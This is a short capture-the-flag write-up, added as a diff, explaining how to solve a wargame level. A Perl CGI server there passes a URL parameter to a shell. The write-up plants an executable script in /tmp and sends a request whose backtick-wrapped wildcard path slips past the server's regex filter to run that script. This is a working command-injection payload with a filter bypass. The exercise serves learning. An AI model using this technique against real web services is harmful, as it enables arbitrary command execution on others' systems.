@@ -1,0 +1,22 @@
+The perl program runs a local server as in level04 and runs CGI as well.
+
+It is not possible to run a binary directly through the url this time since the regex in the program makes it impossible.
+
+The solution is then to execute a file instead of a command :
+
+touch /tmp/RUN
+
+In which we write :
+
+#!/bin/sh
+getflag > /tmp/flag
+
+Put privileges :
+
+chmod +x RUN
+
+Send request :
+
+IP/?x="`/*/RUN`"
+
+The flag is written in /tmp/flag.
